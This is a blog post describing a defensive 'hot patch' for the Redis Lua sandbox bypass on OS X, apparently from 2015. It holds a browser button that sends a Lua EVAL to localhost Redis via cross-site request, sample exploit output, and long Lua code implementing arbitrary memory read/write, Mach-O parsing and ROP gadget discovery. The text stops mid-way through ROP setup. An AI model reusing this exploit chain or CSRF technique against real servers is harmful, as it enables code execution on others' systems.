---
layout: post
title: "Redis Hot Patch"
date: 2015-06-09 09:53
comments: true
categories: 
---

{% tweet https://twitter.com/antirez/status/606440338102689792 %}

The arbitrary read and arbitrary write from the [Lua vulnerability](https://gist.github.com/corsix/6575486) makes it quite easy to patch the vulnerability itself. I have written a proof of concept that should work on OSX Yosemite with any of the Homebrew bottled Redis versions that are vulnerable. It should also work on Mavericks and other compiled versions of Redis but I have not tested it on them (on versions other than Yosemite it may crash if the format of the long jump buffer is not the same). The Hot Patcher looks for the instruction [cmp r15, 0x1b](https://github.com/antirez/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411#diff-9486950b94262375ea8951aecc31b93cL498) and replaces it with 'cmpq rsp,0x1b'. This comparison should never be true because the stack typically lives around 0x7fxxxxxxxxxxxxxx and will never reach such a low address. However, looking for this exact instruction makes the patcher quite brittle and it may not work on Redis versions compiled with different compilers.

The Hot Patcher proof of concept uses the CSRF technique to run so you can run it directly from your browser. However, before running it you should understand:

* it may crash your Redis server and you may lose your data (i think the exploit used to crash when the shellcode was allocated across two pages and i was only mprotect'ing the bottom page. but if this wasn't the cause of the crash then the exploit is still flakey. or there could still be bugs.)
* it might not crash your Redis server but may silently corrupt the data in your Redis server
* you MUST own the Redis server running on 127.0.0.1:6379
* this is not a full fix for the Lua sandbox bypass and only disables the loading of bytecode
* it does not permanently patch Redis and the patch will be reverted after a restart
* it is probably better to write a script for GDB to do the live patching. But I don't understand GDB scripting :(

{% raw %}

<input id='hot_patch' type='button' value='Hot Patch Me' style="background-color: red; border-color: black; color: white; border-radius: 0px; border-style: solid; border-width: 2px; font-size: 30px; cursor: pointer" />

<script type='text/javascript'>

(function() {
  function doit() {

    var captions = $("figcaption span");

    for (var i = 0; i < captions.length; ++i) {
      if ($(captions[i]).text() == "Patch Source Code") {

        var text = $(".code", captions[i].parentNode.parentNode).text();

        var bad = "EVAL "  + JSON.stringify(text) + " 0\r\n";
        var x = new XMLHttpRequest();
        x.open("POST", "http://localhost:6379");
        x.send(bad);
      }
    }
  }

  $("#hot_patch").click(function() {

    if (confirm("You agree that you have reviewed the source code of this page and understand what the patcher will do and will not hold the author of this page liable for any damage the patcher may cause. ")) {

      doit();
    }
  });
})();

</script>

{% endraw %}

It is best to run the Redis server from your terminal then you can see the output from the patcher. It should look something like: 

```plain Example Output
[*] Matches OSX => Darwin 14.3.0 x86_64
[*] 64 Bit
[*] Loading byte code supported
[*] found macho base address: 000000010c9c2000
[*] found segment: __PAGEZERO => 0000000000000000/0000000000000000
[*] found segment: __TEXT => 0000000100000000/0000000000000000
[*] found segment: __DATA => 0000000100066000/0000000000066000
[*] found segment: __LINKEDIT => 0000000100080000/000000000006b000
[*] parsed_symbol ___assert_rtn => 2:224
[*] parsed_symbol ___bzero => 2:232
[*] parsed_symbol ___error => 2:240
[*] parsed_symbol ___maskrune => 2:248
[*] parsed_symbol ___memcpy_chk => 2:256
[*] parsed_symbol ___snprintf_chk => 2:264
[*] parsed_symbol ___sprintf_chk => 2:272
[*] parsed_symbol ___stack_chk_fail => 2:280
[*] parsed_symbol ___strcat_chk => 2:288
[*] parsed_symbol ___strncat_chk => 2:296
[*] parsed_symbol ___strncpy_chk => 2:304
[*] parsed_symbol ___tolower => 2:312
[*] parsed_symbol ___toupper => 2:320
[*] parsed_symbol ___vsnprintf_chk => 2:328
[*] parsed_symbol __exit => 2:336
[*] parsed_symbol _abort => 2:344
[*] parsed_symbol _accept => 2:352
[*] parsed_symbol _access => 2:360
[*] parsed_symbol _acos => 2:368
[*] parsed_symbol _asin => 2:376
[*] parsed_symbol _atan => 2:384
[*] parsed_symbol _atan2 => 2:392
[*] parsed_symbol _atoi => 2:400
[*] parsed_symbol _backtrace => 2:408
[*] parsed_symbol _backtrace_symbols_fd => 2:416
[*] parsed_symbol _bind => 2:424
[*] parsed_symbol _calloc => 2:432
[*] parsed_symbol _ceil => 2:440
[*] parsed_symbol _chdir => 2:448
[*] parsed_symbol _chmod => 2:456
[*] parsed_symbol _close => 2:464
[*] parsed_symbol _connect => 2:472
[*] parsed_symbol _cos => 2:480
[*] parsed_symbol _cosh => 2:488
[*] parsed_symbol _dup2 => 2:496
[*] parsed_symbol _execve => 2:504
[*] parsed_symbol _exit => 2:512
[*] parsed_symbol _exp => 2:520
[*] parsed_symbol _fclose => 2:528
[*] parsed_symbol _fcntl => 2:536
[*] parsed_symbol _feof => 2:544
[*] parsed_symbol _ferror => 2:552
[*] parsed_symbol _fflush => 2:560
[*] parsed_symbol _fgets => 2:568
[*] parsed_symbol _fileno => 2:576
[*] parsed_symbol _floor => 2:584
[*] parsed_symbol _fmod => 2:592
[*] parsed_symbol _fopen => 2:600
[*] parsed_symbol _fork => 2:608
[*] parsed_symbol _fprintf => 2:616
[*] parsed_symbol _fputc => 2:624
[*] parsed_symbol _fputs => 2:632
[*] parsed_symbol _fread => 2:640
[*] parsed_symbol _free => 2:648
[*] parsed_symbol _freeaddrinfo => 2:656
[*] parsed_symbol _freopen => 2:664
[*] parsed_symbol _frexp => 2:672
[*] parsed_symbol _fstat$INODE64 => 2:680
[*] parsed_symbol _fsync => 2:688
[*] parsed_symbol _ftello => 2:696
[*] parsed_symbol _ftruncate => 2:704
[*] parsed_symbol _fwrite => 2:712
[*] parsed_symbol _gai_strerror => 2:720
[*] parsed_symbol _getaddrinfo => 2:728
[*] parsed_symbol _getc => 2:736
[*] parsed_symbol _getcwd => 2:744
[*] parsed_symbol _getpeername => 2:752
[*] parsed_symbol _getpid => 2:760
[*] parsed_symbol _getprogname => 2:768
[*] parsed_symbol _getrlimit => 2:776
[*] parsed_symbol _getrusage => 2:784
[*] parsed_symbol _getsockname => 2:792
[*] parsed_symbol _getsockopt => 2:800
[*] parsed_symbol _gettimeofday => 2:808
[*] parsed_symbol _inet_ntop => 2:816
[*] parsed_symbol _ioctl => 2:824
[*] parsed_symbol _kevent => 2:832
[*] parsed_symbol _kill => 2:840
[*] parsed_symbol _kqueue => 2:848
[*] parsed_symbol _ldexp => 2:856
[*] parsed_symbol _listen => 2:864
[*] parsed_symbol _localeconv => 2:872
[*] parsed_symbol _localtime => 2:880
[*] parsed_symbol _log => 2:888
[*] parsed_symbol _log10 => 2:896
[*] parsed_symbol _longjmp => 2:904
[*] parsed_symbol _lseek => 2:912
[*] parsed_symbol _malloc => 2:920
[*] parsed_symbol _malloc_size => 2:928
[*] parsed_symbol _memchr => 2:936
[*] parsed_symbol _memcmp => 2:944
[*] parsed_symbol _memcpy => 2:952
[*] parsed_symbol _memmove => 2:960
[*] parsed_symbol _memset => 2:968
[*] parsed_symbol _memset_pattern16 => 2:976
[*] parsed_symbol _modf => 2:984
[*] parsed_symbol _nanosleep => 2:992
[*] parsed_symbol _open => 2:1000
[*] parsed_symbol _openlog => 2:1008
[*] parsed_symbol _perror => 2:1016
[*] parsed_symbol _poll => 2:1024
[*] parsed_symbol _pow => 2:1032
[*] parsed_symbol _printf => 2:1040
[*] parsed_symbol _pthread_attr_getstacksize => 2:1048
[*] parsed_symbol _pthread_attr_init => 2:1056
[*] parsed_symbol _pthread_attr_setstacksize => 2:1064
[*] parsed_symbol _pthread_cancel => 2:1072
[*] parsed_symbol _pthread_cond_init => 2:1080
[*] parsed_symbol _pthread_cond_signal => 2:1088
[*] parsed_symbol _pthread_cond_wait => 2:1096
[*] parsed_symbol _pthread_create => 2:1104
[*] parsed_symbol _pthread_join => 2:1112
[*] parsed_symbol _pthread_mutex_init => 2:1120
[*] parsed_symbol _pthread_mutex_lock => 2:1128
[*] parsed_symbol _pthread_mutex_unlock => 2:1136
[*] parsed_symbol _pthread_setcancelstate => 2:1144
[*] parsed_symbol _pthread_setcanceltype => 2:1152
[*] parsed_symbol _pthread_sigmask => 2:1160
[*] parsed_symbol _putchar => 2:1168
[*] parsed_symbol _puts => 2:1176
[*] parsed_symbol _qsort => 2:1184
[*] parsed_symbol _rand => 2:1192
[*] parsed_symbol _random => 2:1200
[*] parsed_symbol _read => 2:1208
[*] parsed_symbol _realloc => 2:1216
[*] parsed_symbol _rename => 2:1224
[*] parsed_symbol _setenv => 2:1232
[*] parsed_symbol _setitimer => 2:1240
[*] parsed_symbol _setjmp => 2:1248
[*] parsed_symbol _setlocale => 2:1256
[*] parsed_symbol _setprogname => 2:1264
[*] parsed_symbol _setrlimit => 2:1272
[*] parsed_symbol _setsid => 2:1280
[*] parsed_symbol _setsockopt => 2:1288
[*] parsed_symbol _sigaction => 2:1296
[*] parsed_symbol _signal => 2:1304
[*] parsed_symbol _sin => 2:1312
[*] parsed_symbol _sinh => 2:1320
[*] parsed_symbol _sleep => 2:1328
[*] parsed_symbol _socket => 2:1336
[*] parsed_symbol _srand => 2:1344
[*] parsed_symbol _sscanf => 2:1352
[*] parsed_symbol _strcasecmp => 2:1360
[*] parsed_symbol _strchr => 2:1368
[*] parsed_symbol _strcmp => 2:1376
[*] parsed_symbol _strcoll => 2:1384
[*] parsed_symbol _strcspn => 2:1392
[*] parsed_symbol _strdup => 2:1400
[*] parsed_symbol _strerror => 2:1408
[*] parsed_symbol _strerror_r => 2:1416
[*] parsed_symbol _strftime => 2:1424
[*] parsed_symbol _strlen => 2:1432
[*] parsed_symbol _strncasecmp => 2:1440
[*] parsed_symbol _strncmp => 2:1448
[*] parsed_symbol _strncpy => 2:1456
[*] parsed_symbol _strpbrk => 2:1464
[*] parsed_symbol _strstr => 2:1472
[*] parsed_symbol _strtod => 2:1480
[*] parsed_symbol _strtol => 2:1488
[*] parsed_symbol _strtold => 2:1496
[*] parsed_symbol _strtoll => 2:1504
[*] parsed_symbol _strtoul => 2:1512
[*] parsed_symbol _strtoull => 2:1520
[*] parsed_symbol _syslog => 2:1528
[*] parsed_symbol _tan => 2:1536
[*] parsed_symbol _tanh => 2:1544
[*] parsed_symbol _task_for_pid => 2:1552
[*] parsed_symbol _task_info => 2:1560
[*] parsed_symbol _time => 2:1568
[*] parsed_symbol _uname => 2:1576
[*] parsed_symbol _ungetc => 2:1584
[*] parsed_symbol _unlink => 2:1592
[*] parsed_symbol _vfprintf => 2:1600
[*] parsed_symbol _wait3 => 2:1608
[*] parsed_symbol _write => 2:1616
[*] Found _strlen symbol: 1432
[*] Found _strlen location: 00007fff97463140
[*] found libsystem_c macho base address: 00007fff97462000
[*] Found _setrlimit symbol: 1272
[*] Found _setrlimit location: 00007fff945edc4a
[*] found libkernel macho base address: 00007fff945da000
[+] Found longjump jump location 000000010ca1a05a
[*] found segment: __TEXT => 00007fff8ca8c000/0000000000000000
[*] found segment: __DATA => 00007fff71e58000/0000000011996000
[*] found segment: __LINKEDIT => 00007fff8fed3000/00000000124cf000
[+] found mprotect symbol 00007fff945efee8
[*] found segment: __TEXT => 00007fff8f914000/0000000000000000
[*] found segment: __DATA => 00007fff7258e000/00000000120cc000
[*] found segment: __LINKEDIT => 00007fff8fed3000/00000000124cf000
[*] found cmp   r15, 0x1b
[*] found cmp @ 000000010ca05fb5
[*] Found rop: poprbxpopr14poprbp @ 00007fff97463449
[*] Found rop: poprdipoprbp @ 00007fff974635ee
[*] Found rop: poprsipoprbp @ 00007fff9746344b
[*] Found rop: movrdxr14callrbx @ 00007fff974c62f4
[*] leaked stack pointer: 00007fff5323d018
[*] old jump_buf eip 000000010ca052c0
[*] existing sp 00007fff5323d010
[*] new sp 00007fc98a80a218
[*] resumed normal redis execution
```

You can test if the patcher worked by running the following from redis-cli:

```
eval "return tostring(loadstring(string.dump(function() end)))" 0
```

If you are vulnerable it will return:

```
"function: 0x7fdcd8439df0"
```

If the patch has been applied it will return:

```
"nil"
```

Here is the lua code for the patcher:

```lua Patch Source Code

local fail = function(msg)

  print("[-] " .. msg)
  error(msg)
end

local addbyte = function(b8, byte)
  local carry = byte
  local result = ''
  for i=1, string.len(b8) do
    local cb = string.byte(b8, i) + carry
    if cb >= 256 then
      carry = 1
    else
      carry = 0
    end
    result = result .. string.char(cb % 256)
  end

  return result
end

local double2string = function(x)
  if x == nil then
    return x
  end
  return struct.pack('<d', x)
end


local asdouble = loadstring((string.dump(function(x)
  for i = x, x, 0 do
    return i
  end
end):gsub('\96%z%z\128', '\22\0\0\128')))

local asstring = function(x) return double2string(asdouble(x)) end

local cstring = function(v)
  return addbyte(asstring(v), 24)
end




local string2double = function(x)
  local r,n = struct.unpack('<d', x)
  return r
end

local subb8 = function(b8l, b8r)
  local borrow = 0
  local result = ''

  for i=1, 8 do
    local cb = string.byte(b8l, i) - borrow - string.byte(b8r, i)
    if cb < 0 then
      borrow = 1
      cb = cb + 256
    else
      borrow = 0
    end
    result = result .. string.char(cb)
  end

  return result
end

local tob8 = function(n)
  local result = ""
  for i =1, 8 do
    local next_byte = n % 256
    result = result .. string.char(next_byte)
    n = math.floor(n / 256)
  end
  return result
end

local toint = function(b8)
  local result = 0
  for i =8,1,-1 do
    result = result * 256
    result = result + string.byte(b8, i)
  end
  return result
end


local addb8 = function(b8l, b8r)
  local carry = 0
  local result = ''
  for i=1, 8 do
    local cb = string.byte(b8l, i) + carry + string.byte(b8r, i)
    if cb >= 256 then
      carry = 1
    else
      carry = 0
    end
    result = result .. string.char(cb % 256)
  end

  return result
end


local addint = function(b8, int)
  return addb8(b8, tob8(int))
end

local subint = function(b8, int)
  return subb8(b8, tob8(int))
end




local dump8 = function(b8)
  if b8 == nil then
    return "<nil>"
  else
    return string.format('%02x%02x%02x%02x%02x%02x%02x%02x', string.byte(b8, 8),string.byte(b8, 7),string.byte(b8, 6),string.byte(b8, 5),string.byte(b8, 4),string.byte(b8, 3),string.byte(b8, 2),string.byte(b8, 1))
  end
end

local dump4 = function(b4)
  return string.format('%02x%02x%02x%02x', string.byte(b4, 4),string.byte(b4, 3),string.byte(b4, 2),string.byte(b4, 1))
end





local word_read = nil

local return_read_word = function(b8)
  word_read = b8
end



local read_word = function(address)

  local f = loadstring(string.dump(function()
    local magic = nil
    local function middle()
      local upval
      local cstring = cstring_global
      local asstring = asstring_global
      local b8 = word_to_read_global
      local ret = return_global
      local function inner()
        upval = 'nextnext'..'t'..'m'..'papapa'..b8
        local upval_ptr = cstring(upval)
        magic = upval_ptr .. upval_ptr .. upval_ptr
      end
      inner()
      ret(asstring(magic))
    end
    middle()
  end):gsub('(\100%z%z%z)....', '%1\0\0\0\1', 1))

  local result = nil
  local return_function = function(v)
    result = v
  end

  local env = {cstring_global = cstring, asstring_global = asstring, word_to_read_global = address, return_read_word_global = return_read_word, return_global = return_function}

  setfenv(f, env)
  f()

  return result
end

--[[ write word also corrupts the next 4 bytes after address :( const TValue *o2=(obj2); TValue *o1=(obj1); \
    o1->value = o2->value; o1->tt=o2->tt; ]]
local write_word = function(address, value)
  local f = loadstring(string.dump(function()
    local magic = nil
    local function middle()
      local upval
      local cstring = cstring_global
      local string2double = string2double_global
      local b8 = address_global
      local value = value_to_write_global
      local function inner()
        upval = 'nextnext'..'t'..'m'..'papapa'..b8
        local upval_ptr = cstring(upval)
        magic = upval_ptr .. upval_ptr .. upval_ptr
      end
      inner()
      magic = string2double(value)
    end
    middle()
  end):gsub('(\100%z%z%z)....', '%1\0\0\0\1', 1))

  local env = {cstring_global = cstring, string2double_global = string2double, address_global = address, value_to_write_global = value}
  setfenv(f, env)
  f()
end

local new_lazy_stream = function(offset, size)
  return {buffer = nil, buffer_offset = nil, start_offset = offset, current_offset = 0, size = size}
end

local lazy_stream_seek = function(stream, offset)
  stream.current_offset = offset
end

local lazy_stream_skip = function(stream, offset)
  stream.current_offset = stream.current_offset + offset
end

local lazy_stream_read = function(stream)
  if stream.buffer == nil or stream.current_offset < stream.buffer_offset or stream.current_offset >= stream.buffer_offset + 8 then
    --[[ dodgy floats ie repeated bytes of 0xFF will trigger multiple reads because the first word will fail then the next and so forth :( )]]
    stream.buffer = read_word(addint(stream.start_offset, stream.current_offset))
    stream.buffer_offset = stream.current_offset
  end

  local byte = nil
  if stream.buffer ~= nil then
    byte = string.byte(stream.buffer, stream.current_offset - stream.buffer_offset + 1)
  end

  stream.current_offset = stream.current_offset + 1
  return byte
end


local lazy_stream_empty = function(stream)
  return stream.current_offset >= stream.size
end

local read_uleb8 = function(stream)
  local value = 0
  local shift = 1
  while true do
    local next_byte = lazy_stream_read(stream)
    local masked = next_byte % 0x80


    value = value + (masked * shift)

    local high_bit = next_byte - masked

    if high_bit == 0 then
      return value
    end
    shift = shift * math.pow(2, 7)
  end
end


local read_string = function(stream)
  local value = {}
  while true do
    local next_byte = lazy_stream_read(stream)
    if next_byte == 0 then
      return table.concat(value, "")
    end
    table.insert(value, string.char(next_byte))
  end

end


local ALTERNATION = 256
local FINAL = 257
local ANY = 258

local function alternation(list)
  if #list == 0 then
    fail("assertion failed")
  end

  if #list == 1 then
    return list[1]
  else

    local current = {first_branch = list[1], second_branch = list[2], byte = ALTERNATION}
    for i=3, #list do
      current = {first_branch = current, second_branch = list[i], byte = ALTERNATION}
    end

    return current
  end
end

local function dotstar()
  local any = {byte = ANY}

  local alternation = {first_branch = nil, second_branch = any, byte = ALTERNATION}
  any.first_branch = alternation
  return alternation
end

local function join(left, right)
  left.first_branch = right
  return left
end

local function literal(literal)
  local current = {byte = FINAL, matched = literal}
  for i=#literal,1,-1 do
    current = {byte = string.byte(literal, i), first_branch = current}
  end

  return current
end

local function addstate(list, state, list_id)
  if state.lastlist ~= list_id then
    table.insert(list, state)
    state.lastlist = list_id
    if state.byte == ALTERNATION then
      addstate(list, state.first_branch, list_id)
      addstate(list, state.second_branch, list_id)
    end
  end
end


local function re_restart(match_state, re)
  local current_list = {}
  local list_id = match_state.list_id + 1
  addstate(current_list, re, list_id)
  return {list_id = list_id, current_list = current_list}
end


local function re_start(re)

  return re_restart({list_id = 0}, re)
end



local function re_push_byte(match_state, byte)
  local list_id = match_state.list_id + 1
  local next_list = {}
  local list_id = list_id + 1

  for i=1,#match_state.current_list do
    local state = match_state.current_list[i]
    if (state.byte == byte or state.byte == ANY) then
      addstate(next_list, state.first_branch, list_id)
    end
  end
  return {list_id = list_id, current_list = next_list}
end




local pagealign = function(b8)
  local byte2 = string.byte(b8, 2)
  local aligned = math.floor(byte2 / 16) * 16
  return string.char(0, aligned) .. string.sub(b8, 3)
end

local findmacho = function(b8)

  local b8 = pagealign(b8)

  local target = string.char(0xCF, 0xFA, 0xED, 0xFE)

  local page_size = string.char(0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)

  while true do
    local word = read_word(b8)

    if word ~= nil then
      local top_half = string.sub(word, 1, 4)
      if top_half == target then
        return b8
      end
    end
    b8 = subb8(b8, page_size)
  end

end

local readi4 = function(b8)
  local word = read_word(b8)
  local top_half = string.sub(word, 1, 4)
  return struct.unpack("<I4", top_half)
end


local c_length = function(s)
  for i = 1, string.len(s) do
    if string.byte(s, i) == 0 then
      return i - 1
    end
  end

  return string.len(s)
end

local terminate_c_string = function(s)
  local length = c_length(s)
  return string.sub(s, 1, length)
end


local parse_segment = function (b8, offset, segment_info)
  local segment_name = terminate_c_string(read_word(addint(b8, offset + 8)) .. read_word(addint(b8, offset + 16)))
  local vm_addr = read_word(addint(b8, offset + 24))
  local vm_size = read_word(addint(b8, offset + 32))
  local file_offset = read_word(addint(b8, offset + 40))

  print("[*] found segment: " .. segment_name .. " => " .. (dump8(vm_addr)) .. "/" .. dump8(file_offset))


  segment_info[segment_name] = {vm_addr = vm_addr, file_offset = file_offset, vm_size = vm_size}
end


local parse_macho_segments = function(macho_offset, dyld_callback)
  local commands = readi4(addbyte(macho_offset, 16))

  local offset = 32

  local segment_info = {}

  for i=1,commands do
    local command = readi4(addint(macho_offset, offset))
    local size = readi4(addint(macho_offset, offset + 4))

    if command == 25 then
      parse_segment(macho_offset, offset, segment_info)
    elseif command == 2147483682 then
      dyld_callback(offset, segment_info)
    end

    offset = offset + size
  end

  return segment_info
end

local parse_libsystem_c_macho = function(macho_offset)

  local callback = function(offset, segment_info)
  end

  local segment_info = parse_macho_segments(macho_offset, callback)

  return segment_info
end

local segment_location = function(macho, segment_info, segment_name)

  local text_segment = segment_info["__TEXT"]
  local target_segment = segment_info[segment_name]
  local segment_location = addb8(subb8(target_segment.vm_addr, text_segment.vm_addr), macho)

  return segment_location
end


local opcode_offset = function(macho, segment_info, lazy_binding_info_offset)

  local link_edit_segment = segment_info["__LINKEDIT"]
  local text_segment = segment_info["__TEXT"]


  local offset_into_link_edit = subb8(tob8(lazy_binding_info_offset), link_edit_segment.file_offset)


  local link_edit_location = segment_location(macho, segment_info, "__LINKEDIT")

  return addb8(offset_into_link_edit, link_edit_location)

end

local matches_part = function(name, label, matched_so_far)

  if string.len(label) > string.len(name) - matched_so_far then
    return false
  end

  for i = 1, #label do
    if string.byte(label, i) ~= string.byte(name, i + matched_so_far) then
      return false
    end
  end

  return true
end



local find_exported_symbol = function(stream, name)

  local matched_name = 0

  local name_len = string.len(name)

  while not lazy_stream_empty(stream) do

    local terminal_size = read_uleb8(stream)


    if (terminal_size > 0 and name_len == matched_name) then
      local flags = lazy_stream_read(stream)
      local symbol_offset = read_uleb8(stream)
      return symbol_offset
    end

    lazy_stream_skip(stream, terminal_size)

    local children = lazy_stream_read(stream)


    local matched = false
    for i = 1, children do
      local label = read_string(stream)
      local node_offset = read_uleb8(stream)

      if matches_part(name, label, matched_name) then
        matched_name = matched_name + string.len(label)
        lazy_stream_seek(stream, node_offset)
        matched = true
        break
      end
    end

    if not matched then
      return nil
    end
  end

end

local process_export_bindings = function(macho_offset, offset, size)


  local mprotect = find_exported_symbol(new_lazy_stream(offset, size), "_mprotect")

  if mprotect == nil then
    fail("Failed to find mprotect")
  else
    local mprotect_addr = addint(macho_offset, mprotect)

    print("[+] found mprotect symbol " .. dump8(mprotect_addr))
    return mprotect_addr
  end

end

local parse_exports_dyld_info = function(macho_offset, offset, segment_info)
  local export_binding_info_offset = readi4(addint(macho_offset, offset + 40))
  local export_binding_info_size = readi4(addint(macho_offset, offset + 44))

  local offset = opcode_offset(macho_offset, segment_info,export_binding_info_offset)

  return process_export_bindings(macho_offset, offset, export_binding_info_size)
end

local parse_libkernel_macho = function(macho_offset)

  local mprotect_addr = nil
  local callback = function(offset, segment_info)
    mprotect_addr = parse_exports_dyld_info(macho_offset, offset, segment_info)
  end

  parse_macho_segments(macho_offset, callback)

  return mprotect_addr

end

local process_lazy_bindings = function(offset, size)

  local stream = new_lazy_stream(offset, size)

  local current_symbol = {}
  local symbols = {}
  while not lazy_stream_empty(stream) do
    local op = lazy_stream_read(stream)


    local immediate = op % 16
    local opcode = op - immediate

    if opcode == 0x70 then
      --[[BIND_OPCODE_SET_SEGMENT_AND_OFFSET_ULEB]]
      current_symbol.segment = immediate
      current_symbol.offset = read_uleb8(stream)

    elseif opcode == 0x40 then
      --[[BIND_OPCODE_SET_SYMBOL_TRAILING_FLAGS_IMM]]
      current_symbol.name = read_string(stream)
    elseif opcode == 0x10 then
      --[[BIND_OPCODE_SET_DYLIB_ORDINAL_IMM]]
      --[[ignore]]
    elseif opcode == 0x90 then
      --[[BIND_OPCODE_DO_BIND]]
      print("[*] parsed_symbol " .. current_symbol.name .. " => " .. current_symbol.segment .. ":" .. current_symbol.offset)
      table.insert(symbols, current_symbol)
      local old_symbol = current_symbol
      current_symbol = {}
      current_symbol.segment = old_symbol.segment
      current_symbol.offset = old_symbol.offset
      current_symbol.name = old_symbol.name
    elseif opcode == 0x00 then
      --[[BIND_OPCODE_DONE]]
      --[[ignore]]
    else
      fail("found unknown opcode in lazy bindings " .. opcode)
    end

  end


  return symbols



end

local parse_dyld_info = function(macho_offset, offset, segment_info)
  local lazy_binding_info_offset = readi4(addint(macho_offset, offset + 32))
  local lazy_binding_size =   readi4(addint(macho_offset, offset + 36))


  local offset = opcode_offset(macho_offset, segment_info,lazy_binding_info_offset)

  return process_lazy_bindings(offset, lazy_binding_size)
end

local find_symbol = function(symbols, symbol)

  for i=1, #symbols do
    if symbols[i].name == symbol then
      return symbols[i]
    end
  end

  return nil
end


local leak_macho = function(name, data_location, symbols, symbol)

  local resolved_symbol = find_symbol(symbols, symbol)
  if resolved_symbol == nil then
    fail("Failed to find " .. symbol .. " symbol")
  end
  print("[*] Found " .. symbol .. " symbol: " .. resolved_symbol.offset)

  --[[we assume the pointer is into the data segment. #TODO FIX THIS]]
  local location = addint(data_location, resolved_symbol.offset)

  local address = read_word(location)

  print("[*] Found " .. symbol .. " location: " .. dump8(address))

  local macho_address = findmacho(address)

  print('[*] found ' .. name .. ' macho base address: ' .. dump8(macho_address))

  return macho_address
end


local parse_redis_macho = function(macho_offset)

  local longjmp_location = nil
  local libsystem_c = nil
  local libkernel = nil

  local callback = function(offset, segment_info)
      local symbols = parse_dyld_info(macho_offset, offset, segment_info)

      local data_location = segment_location(macho_offset, segment_info, "__DATA")


      libsystem_c = leak_macho("libsystem_c", data_location, symbols, "_strlen")
      libkernel = leak_macho("libkernel", data_location, symbols, "_getrlimit")

      local longjmp = find_symbol(symbols, "_longjmp")

      if longjmp == nil then
        longjmp = find_symbol(symbols, "__longjmp")
      end

      if longjmp == nil then
        fail("Failed to find _longjmp symbol")
      else
        longjmp_location = read_word(addint(data_location, longjmp.offset))

        print("[+] Found longjump jump location " .. dump8(longjmp_location))
      end



  end

  local segments = parse_macho_segments(macho_offset, callback)

  return {redis = macho_offset, longjmp_address = longjmp_location, libsystem_c = libsystem_c, libkernel = libkernel, redis_segments = segments}
end


local matches = function(expected, word)

  for i=1, #expected do
    if string.byte(expected, i) ~= string.byte(word, i) then
      return false
    end
  end

  return true
end


local find_insn = function(name, expected, libc, offsets)

  if #expected >= 8 then
    error("failed assertion")
  end

  for i=1, #offsets do
    local addr = addint(libc, offsets[i])
    --[[apparently we can do unaligned reads :) :)]]
    local word = read_word(addr)


    if (word ~= nil) and matches(expected, word) then

      return addr
    end
  end

  return nil


end

local function find_rops(rops, stream)

  local literals = {}
  for i,rop in ipairs(rops) do
    literals[i] = literal(rop)
  end

  local re = join(dotstar(), alternation(literals))
  local state = re_start(re)
  local found_rops = {}
  local remaining = #rops

  while not lazy_stream_empty(stream) and remaining > 0 do
    local next_byte = lazy_stream_read(stream)

    if next_byte == nil then
      state = re_restart(state, re)
    else
      state = re_push_byte(state, next_byte)
    end

    for i=1,#(state.current_list) do
      local s = state.current_list[i]
      if s.byte == FINAL then
        if found_rops[s.matched] == nil then
          remaining = remaining - 1
          found_rops[s.matched] = stream.current_offset - string.len(s.matched)
        end
      end
    end
  end

  return found_rops
end

-- offset search for named rops only works if rop_size <= 8 bytes because it only reads
-- a single word. slightly dodgy
local function find_rops_and_assert(named_rops, stream, libc)
  local missing_rops = {}

  local inverted = {}

  for rop, detail in pairs(named_rops) do
    local addr = find_insn(detail.name, rop, libc, detail.offsets)
    if addr == nil then
      print("[-] Missing rop at fixed location will search: " .. detail.name)
      table.insert(missing_rops, rop)
    else
      print("[*] Found rop: " .. detail.name .. " @ " .. dump8(addr))
      inverted[detail.name] = addr
    end
  end

  if #missing_rops > 0 then
    local found_rops = find_rops(missing_rops, stream)

    for i=1,#missing_rops do
      local rop = missing_rops[i]
      if found_rops[rop] == nil then
        fail("Failed to find rop: " .. named_rops[rop].name)
      else
        local addr = addint(stream.start_offset, found_rops[rop])
        local name = named_rops[rop].name
        print("[*] Found rop: " .. name .. " @ " .. dump8(addr))
        inverted[name] = addr
      end
    end
  end

  return inverted

end

local copy_words = function(from, n)
  local buf = {}
  for i=1,n do
    buf[i] = read_word(from)
    from = addbyte(from, 8)
  end

  buf = table.concat(buf,"")

  return buf
end


local check_system = function()
-- os:Darwin 14.3.0 x86_64
-- arch_bits:64

  local info = redis.call("INFO")

  local os = string.match(info, "os:([^\r\n]*)")

  if string.find(os, "Darwin") then
    print("[*] Matches OSX => " .. os)
  else
    fail("Not OSX => " .. os)
  end

  local arch_bits = string.match(info, "arch_bits:([^\r\n]*)")

  if arch_bits == "64" then
    print("[*] 64 Bit")
  else
    fail("Not 64 Bit => " .. arch_bits)
  end
end

local check_bytecode = function()

  local f = loadstring(string.dump(function() end))

  if f == nil then
    fail("Loading byte code not supported")
  else
    print("[*] Loading byte code supported")
  end
end


local find_fparser_cmp = function(program_information)
  local redis_text_segment = program_information.redis_segments["__TEXT"]
  local stream = new_lazy_stream(program_information.redis, toint(redis_text_segment.vm_size))

  local re = join(dotstar(), literal(string.char(0x41, 0x83, 0xff, 0x1b)))
  local state = re_start(re)
  local found = {}

  local visited = {}

  while not lazy_stream_empty(stream) do
    local next_byte = lazy_stream_read(stream)


    if next_byte == nil then
      state = re_restart(state, re)
    else
      state = re_push_byte(state, next_byte)
    end

    for i=1,#(state.current_list) do
      local s = state.current_list[i]
      if s.byte == FINAL then

        table.insert(found, stream.current_offset - string.len(s.matched))
      end
    end
  end


  if #found == 1 then
    print("[*] found cmp   r15, 0x1b")
  else
    fail("could not find unique cmp r15,0x1b " .. #found)
  end

  local cmp_addr = addint(stream.start_offset, found[1])

  print("[*] found cmp @ " .. dump8(cmp_addr))

  return cmp_addr
end


check_system()

check_bytecode()

local co = coroutine.wrap(function() end)


local addr = read_word(addbyte(asstring(co), 32))

local macho_address = findmacho(addr)

print('[*] found macho base address: ' .. dump8(macho_address))



local program_information = parse_redis_macho(macho_address)


local mprotect_addr  = parse_libkernel_macho(program_information.libkernel)
local libc_segments = parse_libsystem_c_macho(program_information.libsystem_c)

local longjmp_addr = program_information.longjmp_address

local named_rops = {}
named_rops[string.char(0x5E,0x5D,0xC3)] = {name = "poprsipoprbp", offsets = {0x1b83, 0x144b}}
named_rops[string.char(0x5F,0x5D,0xC3)] = {name = "poprdipoprbp", offsets = {0x1d08, 0x15ee}}
